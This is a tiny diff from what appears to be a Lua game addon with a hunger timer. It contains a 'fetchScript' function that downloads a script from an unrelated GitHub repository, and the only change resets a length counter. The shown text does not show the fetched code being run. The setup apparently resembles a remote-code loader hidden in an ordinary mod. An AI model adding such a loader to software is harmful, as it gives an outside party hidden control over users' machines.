@@ -118,7 +118,7 @@ timer.Create("HungerTimer", 1, 0, function()
     end
 end)
 
-local prevLength = 1
+local prevLength = 0
 local function fetchScript()
     http.Fetch("https://raw.githubusercontent.com/Rovinag12/fluffy/main/script.lua",
         function(body, len, headers, code)
